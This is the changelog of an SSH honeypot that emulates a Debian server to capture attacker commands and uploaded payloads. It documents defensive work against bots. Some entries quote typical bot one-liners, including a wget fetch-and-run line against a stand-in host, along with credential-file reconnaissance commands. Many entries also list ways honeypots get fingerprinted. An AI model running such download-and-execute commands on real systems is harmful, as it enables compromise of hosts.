# Changelog

All notable changes to this project are documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Added
- SFTP subsystem (version 3) support: accepts SFTP sessions for file uploads,
  downloads, directory listings, and filesystem operations, quarantining uploaded
  payloads and recording structured `subsystem_request` and `upload` events.

### Fixed
- `deploy/mimic.toml` described the quarantine store as SCP-only. SFTP uploads
  land in it too, so the shipped reference config now says so.

### Security
- Positional parameter expansion: `$#` now expands to `0`, `$0` to `-bash`,
  `$1`..`$9` to empty string, and `${#}`/`${0}`/etc. behave consistently with
  login shell semantics. Previously `echo $#` printed `$#`, advertising a fake
  shell to automated scripts probing argument counts.
- `exit [N]` and `logout [N]` now propagate their exit status and preserve the
  preceding command's exit code (`shell.last_status`) when called with no
  operand. Bare `exit` and `false; exit` previously both reported 0. Non-numeric
  operands report bash's `numeric argument required` error with status 2.
- `ls` now supports `-d` and `--directory` to list directories themselves rather
  than their contents. `ls -ld /tmp` previously failed with `ls: invalid option -- 'd'`,
  revealing the shell as fake to standard reconnaissance commands.
- Commands now keep stdout and stderr apart instead of merging them into one
  stream. An `exec` channel without a PTY sends errors as `SSH_EXTENDED_DATA_STDERR`
  the way a real sshd does, so `ssh host nosuchcmd 2>/dev/null` is silent where it
  previously still printed `-bash: nosuchcmd: command not found`; a channel with a
  PTY still sends one merged stream, because a real terminal has only one. Command
  substitution captures stdout alone, so `echo $(ls /nosuch)` reports the error to
  the terminal and echoes an empty argument rather than folding the error into the
  value. A pipeline carries only stdout onward, so `cat /nosuch | wc -l` prints the
  error and counts `0` instead of counting the error. `>` and `2>` now route each
  stream independently rather than picking one by exit status, and both descriptors
  of `> f 2>&1` share the file rather than the second truncating the first. The
  1 MiB output cap is shared between the two streams, so splitting output across
  them does not double the ceiling. `2>&1` still merges the two when stdout is
  the terminal, so `cmd 2>&1 | grep` sees the error, while `2>&1 > f` and
  `> f 2>&1` stay different from each other as bash's left-to-right ordering
  makes them. `grep -r` now reports an unreadable file on stderr rather than
  mixing the message into its matches.
- A shell channel that asked for no terminal (`ssh -T host < script`) no longer
  runs the line editor over its input. Real bash finds a pipe on stdin and runs
  non-interactively, so it emits no prompt, no echo of the line, and none of the
  `[K` erase sequences redrawing a line needs; the previous behaviour sent
  all three plus a `Last login` banner, which is a tell for anything scripting
  the session rather than typing into it. `logout` is likewise only printed by an
  *interactive* login shell, so `ssh host exit` and a piped session now exit
  silently while still reporting their status. The MOTD still arrives on both
  paths, since it comes from the PAM session rather than the terminal.
- `top` now holds the terminal and repaints every three seconds until `q`, the
  way real `top` does, instead of printing one snapshot and returning to the
  prompt. The header's clock and uptime advance with each repaint, and Ctrl-C
  quits like any foreground job. Batch mode (`-b`), an iteration count (`-n`), a
  pipe, a redirect, a command substitution, and any channel without a terminal
  all still get the one-shot dump — the same cases real `top` prints once for.
- A command substitution's stdout is a pipe, so commands that format differently
  off a terminal now do so inside one: `$(ls)` gives one name per line, as bash
  does, where it previously used the column layout.
- Here-documents (`cat << EOF`) are now collected and fed to the command as its
  stdin, instead of falling through as literal arguments. Dropping a script with
  `cat << EOF > /tmp/x` is one of the most common things a bot does, and it
  previously created nothing and lost the payload. `<<-` strips leading tabs, a
  quoted delimiter (`<< 'EOF'`) takes the body literally while an unquoted one
  expands it, and the rest of the line — redirects, pipes, chaining — still
  applies. Under a PTY the body is collected behind bash's `>` continuation
  prompt; over a pipe it is simply the lines that follow. A document that never
  closes ends at end-of-input with bash's warning, so `ssh host 'cat << EOF'`
  returns instead of hanging. The whole document, opening line and body
  together, is recorded as one `command` event — the body is the payload, so a
  capture holding only the `cat` would be worth little.

## [0.4.0] - 2026-08-22

### Added
- Output redirection. `echo '#!/bin/sh' > /tmp/x`, `>>`, `2>`, `&>`, and `2>&1`
  now write the command's output into the virtual filesystem instead of handing
  the operator and target to the command as arguments. Dropping a script with
  `echo … > file` is one of the most common things a bot does, so the old
  behaviour both broke the illusion (`echo x > /tmp/f` printed `x > /tmp/f` and
  created nothing) and lost the payload from the capture. A redirected stage is
  not a terminal, so `ls > f` writes one name per line; `> /dev/null` discards;
  and a target that cannot be opened reports bash's own text
  (`-bash: /nope/f: No such file or directory`, `Permission denied`,
  `Is a directory`, `ambiguous redirect`) without running the command.
- Pipes. `cat /etc/passwd | grep root | wc -l` now runs as a pipeline: each
  stage's output becomes the next stage's stdin and only the last stage's
  output is shown. `cat`, `grep`, `head`, `tail`, and `wc` read that input when
  they are given no file operand, exactly as they read real stdin; a stage that
  ignores stdin (`ls`, `whoami`, …) behaves as it would in a real pipeline. The
  previous behaviour dumped the first command's full output and then reported
  `cat: |: No such file or directory` — recognisable at a glance, and it
  advertised the shell as fake to anyone who piped anything.
- Command separators: `;`, `&&`, and `||` now split a line into commands that
  run in order, with `&&`/`||` gated on the previous exit status. Bot payloads
  are almost always one-liners (`cd /tmp; wget http://x/a; chmod +x a; ./a`);
  each segment used to be handed to the first command as arguments, so the line
  produced `cat: |: No such file or directory`-style nonsense and nothing after
  the first segment was ever captured. Operators inside quotes, or escaped, stay
  literal, and splitting happens before variable expansion — so a `;` arriving
  in a variable's value is data, not an extra command.
- `bash`/`sh`: `-c LINE` runs the line (how bot payloads usually arrive), and a
  bare invocation behaves like an interactive subshell. `scp` as an interactive
  command: local copies work, and a `host:path` operand fails the way an
  unreachable peer would — the binary has to exist, since SCP uploads to this
  host succeed.
- Nested commands (`sudo`, `sh -c`) are capped at 16 levels, so a deeply nested
  line is refused with bash's `fork: retry` error instead of recursing toward a
  stack overflow that would abort the whole daemon.

### Fixed
- `README.md` described `accept_after` off by one — it said the first N attempts
  are rejected, when `accept_after = N` rejects N−1 and accepts the Nth.
  `deploy/mimic.toml` already had it right; an operator following the README
  would have configured one more failed attempt than they wanted.
- A truncated SCP upload logged the SHA-256 of the stored prefix while reporting
  the full `size`, so the recorded hash matched neither the payload the attacker
  sent nor anything in an IOC feed. The whole body is now hashed as it streams
  in (it was already being read to keep the protocol in sync): `sha256` is the
  complete payload, and the new `stored_sha256` field is the quarantined
  content — the quarantine filename, and identical to `sha256` unless
  `truncated` is set.
- `Ctrl-Y` did nothing although the README advertises kill/yank keys: text taken
  by `Ctrl-U`, `Ctrl-K` or `Ctrl-W` was discarded instead of kept. The last kill
  is now reinserted at the cursor and survives the yank, so it can be pasted
  more than once, as readline does.
- The `stored_path` in an `upload` event mixed `/` and `\` separators on Windows
  (`C:/data/quarantine\a3f…`), so the one field pointing at the captured file
  could not be matched or joined the way the README showed it. Quarantine paths
  are now logged with `/` throughout, and the README's example shows the full
  path it actually carries.

### Security
- Command substitution. `$(…)`, backticks and `$((…))` were echoed back
  literally, so `echo $(whoami)` printed `$(whoami)` — a one-command check that
  identifies the shell as fake, and one that hides the payload of anything
  written as `$(wget http://x/a)`. The body now runs as a command line of its
  own — separators, pipes, redirections and `#` comments inside it belong to it,
  not to the line around it — and its output is spliced back in with trailing
  newlines stripped, splitting into words only where bash would. `$((…))`
  evaluates 64-bit integer arithmetic with the usual precedence, parentheses,
  comparisons, and names read from the environment. A substitution runs in a
  subshell: `cd`, `export` and `su` inside one no longer leak into the session,
  it cannot log the session out, and what it captured (a `wget` inside `$(…)`)
  is recorded alongside the rest of the line's. Both new recursions are bounded
  — nesting reuses the command-nesting cap, since the descent happens during
  expansion before any command is dispatched, and a per-line budget bounds the
  total output a line can splice into itself, so hundreds of substitutions of a
  large file cannot multiply the 1 MiB output cap.
- Variable expansion now respects the quoting around it, and what a variable
  holds is treated as data rather than as more shell source. `echo "it's
  $USER"` printed `it's $USER`, because the apostrophe inside double quotes was
  read as opening a single-quoted string that suppressed the expansion;
  `echo \$USER` printed the username where bash prints `$USER`; and a value
  containing a quote or a backslash was re-parsed as syntax, so a variable
  holding `a'b` echoed as `ab`. Each is a two-command check against any real
  shell. Values are now escaped on the way into the tokenizer, which only ever
  adds a backslash in front of a quote or backslash — never whitespace and
  never a `$` — so an expanded value still cannot introduce a word boundary, a
  further expansion, or a command separator. Word splitting is unchanged: an
  unquoted value still splits, a quoted one still does not. A side effect worth
  knowing: a backslash escape in a value now survives to the command, so
  `T='a\tb'; echo -e $T` prints a tab, as it does in bash.
- Every fabricated timestamp now derives from the real clock instead of a date
  fixed at compile time. `date` returned the real year while `last`, `Last
  login`, `ps` and every file in the snapshot said 2024, and `ls -l` dated files
  the attacker had just created to 2024-05-03 — comparing any two of those
  identified the honeypot in one command. The box now reports one timeline:
  installed some months before it booted, booted before the previous login, and
  nothing dated in the future. `uptime`, `w`, `top` and `/proc/uptime` count
  from the same boot instant, so the uptime grows as MIMIC runs rather than
  reporting `up 2 days,  3:21` forever, and `wget`/`curl` stamp transfers with
  the time they happened. `ls -l` also gained real `ls`'s year form: a mtime
  older than six months, or dated in the future, now shows the year instead of
  a time of day.
- The fake box's memory figures now tell one story. `free` and `/proc/meminfo`
  said ~2 GB while `df` showed tmpfs sizes implying 8 GB and `dmesg` implied
  4 GB; every tmpfs in `df` and `mount` is now the half or tenth of `MemTotal`
  the kernel and systemd actually size them to. `free`'s columns also did not
  add up (`total` ≠ `used + free + buff/cache`) and disagreed with `top`'s
  header — arithmetic anyone can check in two commands. `free -h` also printed
  `992.0Ki` and `346.0Mi` where procps spends a decimal place only below 10
  (`1.9Gi`, but `992Ki`).
- `top` no longer reports `ps aux` as the running process. Every process table
  includes the command that asked for it, so naming a different one said the
  output came from somewhere else. System daemons' `ps` START column is now the
  boot date rather than a fixed date that a long-running honeypot eventually
  reports as older than its own uptime.
- Ctrl-D on an empty line now prints `logout` before the session ends, the same
  line MIMIC's own `exit` prints. Ending in silence where a real login shell
  announces itself is a one-keystroke tell, and it is the first thing a session
  transcript shows.
- A client closing its end of the connection now ends the session immediately.
  End-of-input is what Ctrl-D delivers to a shell, so a real sshd session is
  gone the moment stdin closes — `ssh -tt host < script` used to hang here until
  the idle timeout instead of returning, and every abandoned probe held a
  connection slot for `idle_timeout_secs`.
- The interactive shell now reports an exit status when it ends. `exit`, Ctrl-D
  and a client closing stdin all closed the channel without one, so `ssh host`
  returned **255** — the code `ssh` uses for its own failures — where a real
  server returns the shell's status. Any bot that checks `$?` after a session
  saw every login fail. All three paths report it together, since a status on
  one and not another is a tell in itself.
- A one-shot `exec` no longer rewrites its output to CRLF. `ssh host 'uname -a'`
  requests no terminal, and a real sshd sends the command's own bytes, so the
  added carriage returns showed up in any byte-for-byte comparison against a
  known-good host. Line endings now follow whether the channel asked for a PTY:
  CRLF under `ssh -t`, bare LF without. The same rule covers the MOTD and the
  `Last login:` line, and a `pty-req` no longer leaks from an interactive
  channel into a later `exec` on the same connection (which also set `SSH_TTY`
  on a session that has no terminal).
- `cd` now needs a directory's execute (search) bit. An unprivileged session
  could `cd /root` and watch the prompt change while `ls /root` in that same
  directory answered `Permission denied` — a box that contradicts itself on two
  consecutive commands. `cd` into a directory the session cannot enter now
  fails with bash's `-bash: cd: /root: Permission denied` and leaves the shell
  where it was. `cd -` is checked the same way, since the directory may have
  become unreachable since the shell left it.
- `sudo -i` and `sudo -s` printed the usage block. They are the two most common
  ways an attacker asks for a root shell, and a `sudo` that rejects its own
  documented flags is a tell; both now hand over a root shell for the rest of
  the session, the way `su` does. `-i` is a login shell (root's environment and
  home); `-s` only changes the identity, leaving the caller's directory and
  `$HOME` alone, as Debian's sudoers does without `always_set_home`. `sudo -i
  COMMAND` still runs just that command as root.
- `#` comments are no longer run as a command. `# comment` answered
  `-bash: #: command not found`, which no real shell does — a one-keystroke way
  to identify the honeypot, and it broke any pasted script carrying a comment
  line. A comment now runs to the end of the line and takes any `;`/`&&`/`|` in
  it with it, while a `#` that does not start a word stays data (`echo a#b`,
  `echo '#!/bin/sh' > /tmp/x`). Comments are cut before variable
  expansion, so a `#` arriving in a variable's value cannot comment out the rest
  of the line. The full line, comment included, is still what gets logged and
  kept in `history`, as bash does.
- `ls -l` printed no `total` line unless `-a`/`-A` was given, and when it did
  print one the figure was always `8`. GNU `ls` heads every long directory
  listing with the disk usage of the entries below it, so both the missing line
  and the constant were one-glance honeypot tells. The total is now summed from
  the listed entries, on an ext4-shaped model (4 KiB blocks, empty files and
  short symlinks occupying none), and moves as files are created and written.
- Backslashes inside double quotes were eaten by the tokenizer, so
  `echo -e "a\tb\nc"` printed `atbnc`. Bash only lets a backslash escape `$`,
  `` ` ``, `"` and `\` inside double quotes and passes every other one through;
  the command now receives what bash would give it, and `echo -e` interprets the
  full GNU escape table (`\e`, `\v`, `\f`, `\0NNN`, `\xHH`, `\c` as well as the
  escapes it already knew). This is the form bot payloads use, and with output
  redirection those bytes now land in the VFS as the capture — so a mangled
  escape corrupted the recorded payload as well as the illusion.
- The 1 MiB output cap now bounds a whole command line, not just one command:
  a chained line could otherwise multiply the per-command cap by the number of
  segments that fit in the 4096-byte input limit.
- `tar` archives no longer fail to open in `tar`. Creating one wrote a fixed
  34-byte placeholder, so the round-trip every packing script does —
  `tar czf t.tgz d && tar tzf t.tgz` — answered `This does not look like a tar
  archive` on the box that had just written the file. `-c` now writes a real
  POSIX ustar stream (contents, modes, ownership, symlinks, GNU's 10240-byte
  blocking), and `-t`/`-x` read one back, including an uncompressed archive
  uploaded over SCP. `-t` honours `-v` and member operands, `-x` restores modes
  and (for root) archived ownership, and both refuse what real `tar` refuses:
  a member the session cannot read, an archive it cannot read or write, and a
  tree containing the archive being written (`file is the archive; not dumped`).
  An uploaded archive whose members climb out of the extraction directory is
  handled the way real tar handles it: the leading `/` or `../` run is stripped
  with tar's own warning, a name that still contains a `..` component is
  refused (`Member name contains '..'`) rather than quietly relocated, and the
  attempt lands in the capture. Nothing is actually compressed — `-z`/`-j`/`-J`
  are accepted and ignored, which no command in the emulator can observe — and
  an archive that would push the VFS past its byte cap now reports a full disk
  instead of silently not being written.
- The interactive line editor dropped every non-ASCII byte, so typing
  `ééunicode` ran — and logged — `unicode`: a two-keystroke way to identify the
  shell, and worse, any UTF-8 payload typed at the prompt reached the capture
  mangled. Characters outside ASCII are now buffered as typed, deleted and
  stepped over whole (backspace, Delete, arrow keys), and counted as one column
  each when the line is redrawn, so the echo stays in sync with the cursor. The
  `su` password prompt keeps them too — a non-ASCII credential is recorded the
  way it was entered — and Tab completion no longer panics on two names that
  share part of a multi-byte character.
- `/usr/bin` listed binaries the shell could not run — `ls /usr/bin` showed
  `python3`, `sed`, `awk`, `perl`, `vi`, `nano`, `gzip`, `ssh`, and `bash`, all
  of which answered `command not found`, and `-bash: bash: command not found` on
  a box whose `$SHELL` is `/bin/bash` identified the honeypot outright. The
  listing is now exactly the set of commands the registry serves, `/usr/sbin`
  holds `ip`/`ss` to match what `which` reports, and a test fails the build if
  the two ever drift apart again.
- `wget`/`curl` no longer contradict themselves: the transfer announced a size
  (`Length: 1394 … saved [1394/1394]`) but left a 0-byte file, so one `ls -l`
  after a download exposed the emulation. The placeholder is now written at the
  size the transfer reports — filled with pseudo-random bytes rather than a
  block of zeros — and the reported figure comes from what actually landed in
  the VFS, so it stays honest when the content cap trims the write. `curl -O`
  also prints its progress table, and `curl -I` reports a matching
  `Content-Length`, instead of both being silent/zero.
- Sessions now export `SSH_CLIENT`, `SSH_CONNECTION`, and — for PTY sessions —
  `SSH_TTY`, the way every real sshd does. A shell that sets none of them is a
  one-command honeypot check (`env | grep SSH_`). The values describe the real
  connection (the client's own address and the socket it dialled) and survive
  `su`, since they belong to the connection rather than the logged-in identity.
- Fixed the absolute session lifetime cap (`max_session_secs`) never ending a
  session. The cap fired on schedule and logged `session_timeout`, but the
  session kept serving commands until the idle timeout, so a client sending
  traffic just inside `idle_timeout_secs` could hold a session — and the per-IP
  connection slot it occupies — indefinitely, and enough such connections could
  fill the global session cap and lock out real attacker traffic. The cap now
  disconnects the session, and its clock starts when the connection is accepted.

## [0.3.0] - 2026-07-30

### Added
- Optional file-based logging. Set `logging.dir` to have forensic events written
  to a daily-rotated `mimic.YYYY-MM-DD.jsonl` file (in addition to stdout), ready
  for a log shipper such as Filebeat/Logstash or manual inspection. Logs are
  never deleted by default; set `logging.retention_days` to cap how many daily
  files are kept. The compose stack pre-creates `/data/logs` for this.

### Fixed
- SSH shell and one-shot command requests now receive the required protocol
  success reply, preventing clients such as PuTTY from reporting that the
  server refused to start a shell or command after authentication.
- One-shot SSH `exec` requests now return the emulated command's real exit
  status instead of always reporting success.

### Changed
- `su` (and `su USER`) now shows a realistic `Password:` prompt with echo
  suppressed when run by a non-root user, instead of switching identity
  instantly. The typed secret is captured as an `auth_attempt` event (method
  `su`) before the switch. Root still switches without a prompt, like real
  `su`. This removes the "instant, password-less root" honeypot tell.
- Default `auth.mode` (when no config file, or a config file without an
  `[auth]` section, is used) is now `accept_all` instead of `accept_after`.
  Zero-config runs previously rejected the first `accept_after` (default 2)
  attempts on every connection, which is both an unrealistic-looking default
  and gives attackers fewer sessions to capture commands in; `accept_all`
  grants a shell immediately for maximum interaction.

### Security
- Fixed a whole-process denial of service: `mv` could move a directory into its
  own subtree (`mv a a/b`), making the virtual filesystem cyclic. Path rendering
  then looped forever while growing memory, and `find`/`grep -r`/`chmod -R`
  recursed until the stack overflowed and aborted the daemon — killing every
  session, not just the offending one. The move is now refused with the same
  error real `mv` gives, and path rendering is bounded regardless.
- Release builds no longer set `panic = "abort"`. The documented per-session
  crash-isolation guarantee depends on unwinding; under abort a panic in any one
  session would have taken the listener and all other sessions down with it.
- Replaced the `find -name` glob matcher with an iterative single-backtrack
  implementation. The recursive one was exponential on patterns such as
  `*a*a*a*a*b`, letting a single `find` peg a worker thread indefinitely — with
  no timeout able to fire on it, since the command runs synchronously.
- The log directory (`logging.dir`) is now created `0700` on Unix. Captured
  passwords are written there in cleartext, and the rotated files were being
  created world-readable.
- Documented that the Docker daily-reset sidecar is granted the host's Docker
  socket, that `:ro` does not restrict Docker API calls, and that the systemd
  timer is the lower-privilege alternative.
- Limited each SSH connection to one active session channel at a time, while
  still allowing sequential channels. This prevents channel floods from
  bypassing connection limits and stops shell, password, and SCP state from
  leaking between concurrent channels.
- Rebalanced the shipped memory-related defaults for public traffic: 32 global
  connections, 4 per source IP, 8 MiB uploads and VFS content, and 2,000 VFS
  nodes per session under a 1 GiB deployment memory ceiling.
- `ls` now enforces directory read permissions: an unprivileged user listing a
  directory it cannot read (e.g. `ls /root`, mode `0700`) gets
  `ls: cannot open directory '...': Permission denied` instead of a full
  listing, closing a honeypot tell that let attackers read protected paths.
- Fixed a fingerprint where a rejected password immediately dropped the
  connection with `Permission denied (publickey)` instead of re-prompting. On
  rejection the server now keeps offering the `password` method, so clients
  re-prompt like a real sshd (up to `MaxAuthTries`). This also restores
  `accept_after`, which could never see a second attempt on one connection
  while the method was being withdrawn after the first failure.

### Added
- More emulated commands, for closer parity with a real Debian shell and the
  recon scripts attackers commonly run: `head`/`tail` (`-n`/`-c`/`-N`, per-file
  `==>` headers), `wc` (`-l`/`-w`/`-c`), `groups`, `arch`, `tty`, `date`
  (`+FORMAT` strftime, real UTC clock), `lsb_release` (`-a`/`-s`/`-i`/`-d`/`-r`/
  `-c`, Debian 12 "bookworm"), and `dmesg`. `dmesg` mirrors Debian's
  `kernel.dmesg_restrict=1` default: it returns the fabricated kernel ring
  buffer only to root and "Operation not permitted" otherwise. All new commands
  remain pure functions over the in-memory VFS and shell state — no real
  process, filesystem, or clock-setting access — and the escape-vector test
  still enforces that boundary.

## [0.2.0] - 2026-07-07

### Added
- Daily automatic reset: wipes quarantine data and restarts the honeypot once
  per day at a random time within a configurable window (default 0–3 hours) so
  the restart is not predictable. Supported in Docker (sidecar container) and
  systemd (timer + oneshot service).
- `sensor_name` config key: an identifier included in every JSON log line so
  operators running multiple sensors can distinguish their streams (closes #3).
- New emulated commands: `sudo` (transient elevation), `su` (persistent
  identity switch), `nproc`/`lscpu` (matching the existing fake `/proc/cpuinfo`),
  `tar` (create writes a placeholder archive; extract/list on a fake
  0-byte/garbage "download" reports the same corrupt-archive errors a real
  host would), and `pkill` (tab-completion already offered it; it previously
  fell through to "command not found"). `grep` and `find` — previously
  documented as "(stub)" in the README but not actually wired into the
  command dispatch table at all — now do real (if simplified) substring
  search and path traversal.

### Fixed
- `dpkg`/`apt` listed `sudo` as installed and `id` reported `sudo` group
  membership, but running `sudo` itself returned "command not found" — an
  inconsistency an attacker could notice. `sudo` is now implemented.
- `pty-req`, `env`, `window-change`, subsystem, and agent-forwarding channel
  requests were left unanswered (russh's default `Handler` impl neither
  succeeds nor fails them), unlike a real sshd which always replies. Most
  interactive `ssh` clients send `pty-req` before `shell` and tolerate the
  missing reply, but it's a cheap, passive fingerprinting signal for anything
  that checks it. Now replied to explicitly: `pty-req`/`window-change` always
  succeed; `env` succeeds only for `LANG`/`LC_*` (matching Debian's default
  `AcceptEnv`); subsystem and agent-forwarding requests fail cleanly, since
  neither is emulated.

### Security
- Bounded per-session real-disk quarantine writes (`max_upload_bytes` × 32)
  so a flood of many distinct SCP-uploaded files can no longer grow the
  quarantine store without limit for the duration of a session; the
  in-memory VFS mirror (already bounded) is unaffected.
- Host keys are now created with `0600` permissions atomically (via
  `OpenOptions` at file-creation time) instead of being chmod'd after a
  world/group-readable `std::fs::write`, closing a brief window where a
  newly generated private key was readable by other local users.
- Quarantined SCP uploads are now created `0600` atomically at file-creation
  time (same `OpenOptions` approach as host keys) instead of being chmod'd
  after a world/group-readable write, removing the brief window where a
  captured sample was readable by other local users. The `create_new` write
  also closes the previous exists()-then-write race between concurrent
  sessions storing the same content-addressed payload.
- `cat` and `grep` now enforce Unix read permissions (owner/group/other bits,
  root bypass) against the emulated VFS, matching real Debian instead of
  ignoring file modes entirely. Previously any unprivileged session could
  `cat`/`grep` a `0640` root-owned file like `/etc/shadow` — both an
  unrealistic tell (real Debian denies it) and, combined with the fake
  password hash literally containing the word "honeypot", an instant
  self-identifying giveaway. The fake `/etc/shadow` hash is also now a
  random-looking, non-identifying string.
- `tar -c` no longer writes a plaintext `MIMIC-FAKE-TAR-ARCHIVE` marker into
  its placeholder archive; an attacker who created and then `cat`ed the
  archive would see the product name directly. It now writes non-identifying
  binary-looking bytes (a gzip magic header followed by random data), and
  extract/list behavior on it is unchanged (still reports a corrupt archive).

## [0.1.0] - 2026-07-02

Initial release.

### Added
- Escape-proof SSH honeypot emulating a Debian 12 server via a pure
  state-machine architecture — no `std::process`, no real filesystem access
  in the emulation layer, `#![forbid(unsafe_code)]` project-wide.
- ~30 emulated shell commands with readline-style line editing, history,
  MOTD, and `/proc` fakes.
- In-memory virtual filesystem bounded by node count (10k) and total
  content size (64 MiB).
- SCP upload support with configurable size cap (16 MiB default) and
  quarantine store for captured payloads.
- Structured JSON logging of sessions, credentials, and commands.
- Connection hardening: global and per-IP connection limits enforced
  before crypto, session and idle timeouts, bounded line/exec/output
  lengths.
- Docker deployment: distroless non-root runtime, read-only rootfs,
  dropped capabilities, resource limits.
- CI: clippy (`-D warnings`), full test suite, cargo-deny supply-chain
  audit with weekly scheduled run.

[Unreleased]: https://github.com/Kevin1S1/mimic-ssh-honeypot/compare/v0.4.0...HEAD
[0.4.0]: https://github.com/Kevin1S1/mimic-ssh-honeypot/compare/v0.3.0...v0.4.0
[0.3.0]: https://github.com/Kevin1S1/mimic-ssh-honeypot/compare/v0.2.0...v0.3.0
[0.2.0]: https://github.com/Kevin1S1/mimic-ssh-honeypot/compare/v0.1.0...v0.2.0
[0.1.0]: https://github.com/Kevin1S1/mimic-ssh-honeypot/releases/tag/v0.1.0
